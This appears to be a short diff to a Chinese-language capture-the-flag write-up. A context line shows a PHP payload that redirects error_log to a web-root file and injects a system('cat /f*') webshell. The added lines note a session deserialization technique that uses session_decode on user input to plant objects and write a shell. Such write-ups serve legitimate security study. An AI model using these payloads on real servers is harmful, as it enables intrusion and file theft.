@@ -43,6 +43,12 @@ function filter($cmd){
 
 `?name=error_log&value=/var/www/html/1.php&1=%00<?php system("cat /f*");?>`
 
+### 9
+session反序列化+写shell
+> 语句session_decode($_GET['token']);往session里面存放对象
+> 语句$data = $_SESSION['user'];往session里面拿取对象，拿取名字为user的对象。
+
+
 
 ## AK赛
 ### 签到_观己
